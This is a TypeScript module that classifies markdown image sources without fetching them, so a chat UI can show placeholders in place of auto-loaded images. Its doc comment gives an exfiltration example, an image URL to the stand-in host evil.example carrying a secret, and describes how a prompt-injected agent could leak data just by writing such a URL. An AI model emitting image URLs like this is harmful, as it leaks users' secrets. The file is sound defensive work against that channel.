import { isExternalHref } from '@lines/shared';

/**
 * What a markdown image points at, decided without loading it.
 *
 * An image is fetched the moment it renders, with nobody clicking anything. In
 * text an agent wrote — or a collaborator, or a README in a cloned repo — that
 * makes `![x](https://evil.example/?q=<secret>)` an exfiltration channel: a
 * prompt-injected agent only has to *write* the URL and the browser delivers it.
 * A link waits for a click, so links are left alone; `Markdown` renders every
 * image as a placeholder instead, and this says what clicking it may open.
 *
 * Nothing here is ever classed as safe to load inline. `data:` and `blob:` would
 * be (they fetch nothing), but react-markdown's default `urlTransform` empties
 * every scheme except http(s), irc(s), mailto and xmpp before a renderer sees
 * it. A same-origin URL gets no exemption either: it is still a request nobody
 * asked for, and this origin's `/download` is a 100 MB installer.
 *
 * Pure, so the server's runner can test it (server/src/markdownImage.test.ts).
 */
export type MarkdownImageTarget =
  /** http(s), absolute or protocol-relative: opened in a new tab, its host shown up front. */
  | { kind: 'url'; href: string; host: string }
  /** No scheme and no `//`: a file path — usually a screenshot the agent saved — for the file preview. */
  | { kind: 'path'; path: string }
  /** Empty (a scheme react-markdown stripped), or a scheme no image is served over. */
  | { kind: 'none' };

export function markdownImageTarget(src: string | undefined, base: string): MarkdownImageTarget {
  const value = src?.trim() ?? '';
  if (!value) return { kind: 'none' };
  // `//host/x.png` has no scheme of its own, but it is not a path: it takes the
  // page's scheme and fetches from `host`. isExternalHref already says so.
  if (isExternalHref(value)) {
    let url: URL;
    try {
      url = new URL(value, base);
    } catch {
      return { kind: 'none' };
    }
    if (url.protocol !== 'http:' && url.protocol !== 'https:') return { kind: 'none' };
    return { kind: 'url', href: url.href, host: url.host };
  }
  // A query or fragment means nothing to a file on disk, and the destination
  // arrives percent-encoded (`<my shot.png>` becomes `my%20shot.png`).
  const path = value.replace(/[?#].*$/, '');
  if (!path) return { kind: 'none' };
  try {
    return { kind: 'path', path: decodeURIComponent(path) };
  } catch {
    return { kind: 'path', path };
  }
}
